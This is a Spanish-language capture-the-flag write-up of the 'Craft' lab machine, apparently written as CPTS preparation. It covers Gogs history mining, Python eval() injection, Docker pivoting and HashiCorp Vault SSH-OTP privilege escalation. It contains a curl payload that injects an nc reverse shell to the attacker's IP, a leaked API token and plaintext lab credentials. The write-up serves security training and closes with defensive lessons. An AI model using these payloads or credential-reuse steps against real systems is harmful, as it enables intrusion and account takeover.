---
title: "Craft (Medium)"
date: 2026-11-07
author: "Isma"
slug: "craft"
tags: ["Linux", "Gogs", "API", "Python eval() Injection", "RCE", "Git History", "Docker", "HashiCorp Vault"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

Craft es una máquina Linux centrada en una API REST de gestión de cervezas y un servidor **Gogs** (un Git self-hosted). El acceso inicial pasa por bucear en el historial de commits del repositorio de la API: un commit antiguo "arregla" una validación de tipos metiendo el campo `abv` directamente dentro de un `eval()` de Python, y otro commit, también antiguo, deja un token de autenticación válido que un issue posterior intenta (sin éxito) tachar. Con ese token exploto el `eval()` para RCE dentro de un contenedor Docker. Desde ahí encuentro credenciales de MySQL, giro a Gogs con la contraseña de `gilfoyle`, y en un repositorio privado de infraestructura hay una clave SSH y un script que configura el backend SSH de **HashiCorp Vault** en modo OTP. Un token de Vault olvidado en el home de `gilfoyle` me permite pedir una OTP y entrar como root.

## Reconocimiento

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6
443/tcp  open  ssl/http nginx 1.15.8
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft
|_http-title: About
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
Service Info: OS: Linux
```

Dos cosas llaman la atención: el certificado TLS menciona `craft.htb`, y hay un **segundo servidor SSH en el 6022** implementado en Go, muy distinto de OpenSSH. Ese detalle será la pista de que en algún punto de la máquina hay **HashiCorp Vault** corriendo (su subcomando `vault ssh` usa justo ese tipo de servidor para el modo OTP).

### Web (443) y subdominios

La web principal es la página "About" de una empresa cervecera, con un enlace a la documentación de una API:

![craft](/images/obsidian/craft/pasted-image-20260904102909.png)

![craft](/images/obsidian/craft/pasted-image-20260904103146.png)

Al enumerar subdominios (vhosts) aparece también un Gogs:

![craft](/images/obsidian/craft/pasted-image-20260904104549.png)

- `api.craft.htb` — la API REST (Flask + Flask-RESTPlus).
- `gogs.craft.htb` — un servidor Git tipo GitHub self-hosted.

## Acceso Inicial (Foothold)

### Minando el historial de Gogs

En Gogs puedo explorar repositorios, usuarios y grupos sin autenticarme. En el repositorio **`Craft/craft-api`** hay un issue donde alguien pega un token de la API para reproducir un bug:

![craft](/images/obsidian/craft/pasted-image-20260904104723.png)

```bash
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' \
     -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ \
     --data '{"name":"bullshit","brewer":"bullshit","style":"bullshit","abv":"15.0")}'
```

Ese token concreto ya ha caducado (lleva un campo `exp` en el JWT), pero el issue es útil por otro motivo: señala un **commit** donde supuestamente se arregla el bug que genera el error. Reviso ese commit:

![craft](/images/obsidian/craft/pasted-image-20260904105326.png)

```python
if eval('%s > 1' % request.json['abv']):
```

El "arreglo" es mucho peor que el bug original: en vez de validar que `abv` sea un número, el valor **crudo** del JSON se interpola dentro de un string que se pasa a `eval()`. Controlando el campo `abv` controlo literalmente código Python que el servidor ejecuta, por ejemplo:

```python
"__import__('os').system('id')"
```

### Un token válido escondido en el historial

El problema es que necesito un token vigente. En el repositorio hay un test de limpieza (`cleanup test`) que se autentica contra la API, pero las credenciales que usa parecen haberse borrado del código actual:

![craft](/images/obsidian/craft/pasted-image-20260904110101.png)

Reviso los commits anteriores a ese borrado y encuentro un token sin caducar todavía metido en un commit antiguo:

![craft](/images/obsidian/craft/pasted-image-20260904110200.png)

### Explotando el eval() para RCE

Con el token vigente mando un payload que, en vez de un número, manda una llamada a `os.system()` con una reverse shell:

```bash
curl -k -X POST https://api.craft.htb/api/brew/ \
     -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...' \
     -H "Content-Type: application/json" \
     --data '{"name":"x","brewer":"x","style":"x","abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.125 4444 >/tmp/f\")"}'
```

![craft](/images/obsidian/craft/pasted-image-20260904110442.png)

![craft](/images/obsidian/craft/pasted-image-20260904110454.png)

Recibo shell. El `hostname` y el sistema de ficheros delatan que estoy dentro de un **contenedor Docker**, no en el host real.

## Movimiento Lateral

### Credenciales de MySQL en settings.py

Dentro del contenedor, la configuración de Flask guarda las credenciales de la base de datos en claro:

![craft](/images/obsidian/craft/pasted-image-20260904111601.png)

```
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_HOST = 'db'
```

El contenedor no tiene cliente `mysql` instalado, así que consulto la base de datos con `pymysql` desde Python:

```bash
python3 -c "
import pymysql
conn = pymysql.connect(host='db', user='craft', password='qLGockJ6G2J75O', db='craft', cursorclass=pymysql.cursors.DictCursor)
cur = conn.cursor()
cur.execute('SELECT * FROM user')
for row in cur.fetchall():
    print(row)
"
```

![craft](/images/obsidian/craft/pasted-image-20260904111909.png)

Obtengo varios hashes/contraseñas de usuarios:

```
ebachman : llJ77D8QFkLPQB
dinesh   : 4aUh0A8PbVJxgd
gilfoyle : ZEU3N8WNM2rh4T
```

Ninguna funciona por SSH contra el host real (`craft.htb`, puerto 22):

![craft](/images/obsidian/craft/pasted-image-20260904112403.png)

### Pivote a Gogs con gilfoyle

Pruebo las mismas credenciales contra **Gogs**, y `gilfoyle` sí tiene cuenta ahí:

![craft](/images/obsidian/craft/pasted-image-20260904112440.png)

En su perfil hay un repositorio privado, **`gilfoyle/craft-infra`**, con la configuración de toda la infraestructura (nginx, mysql, vault…):

![craft](/images/obsidian/craft/pasted-image-20260904112509.png)

Dentro de `.ssh/` hay una clave privada:

![craft](/images/obsidian/craft/pasted-image-20260904112509.png)

### SSH al host real con la clave + passphrase

La clave pide passphrase. Pruebo la misma contraseña de `gilfoyle` que usé en Gogs, y funciona — la reutiliza también como passphrase de la clave:

```bash
ssh -i id_rsa gilfoyle@craft.htb
# Enter passphrase for key 'id_rsa': ZEU3N8WNM2rh4T
```

![craft](/images/obsidian/craft/pasted-image-20260904112823.png)

Ya estoy en el **host real** (no en el contenedor) como `gilfoyle`, y leo la **User Flag**.

## Escalada de Privilegios

### HashiCorp Vault en modo SSH-OTP

El repositorio `craft-infra` tiene una carpeta `vault/` con un script que configura el backend SSH de Vault:

```bash
#!/bin/bash
# set up vault secrets backend
vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

Este backend permite pedirle a Vault una **contraseña de un solo uso (OTP)** para conectarse por SSH como un usuario concreto (aquí, `root`, sin restricción de IP de origen). El servidor Go en el puerto 6022 que vi en el escaneo inicial es justo el que valida esas OTP.

![craft](/images/obsidian/craft/pasted-image-20260904155823.png)

```bash
vault ssh -role root_otp -mode otp root@x.x.x.x
```

El problema es que esto requiere estar **autenticado contra Vault** (`VAULT_TOKEN`). Al revisar el home de `gilfoyle` en el host encuentro un token olvidado:

![craft](/images/obsidian/craft/pasted-image-20260904115611.png)

```bash
cat .vault-token
```

```
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

### Pedir la OTP y entrar como root

Con ese token exportado como `VAULT_TOKEN` (o con `vault login`), pido una sesión OTP para `root` contra la propia máquina y me conecto:

```bash
export VAULT_TOKEN=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
vault ssh -role root_otp -mode otp root@10.129.118.231
```

Vault genera una OTP de un solo uso, la introduzco como contraseña y entro como **root**, leyendo la **Root Flag**.

## Conclusiones

- El historial de Git nunca olvida: borrar una credencial del código actual no la elimina de commits anteriores. Hay que invalidarla (rotarla) y, si hace falta, reescribir el historial.
- Interpolar valores controlados por el usuario dentro de un `eval()` es ejecución de código remoto, sin importar la intención del fix.
- Reutilizar la misma contraseña para el usuario, la cuenta de Gogs y la passphrase de la clave SSH convierte una sola fuga en acceso total.
- Un token de Vault dejado en el home de un usuario, sin TTL corto ni revocación, anula por completo el modelo de "credenciales de un solo uso" que Vault SSH-OTP está pensado para dar.
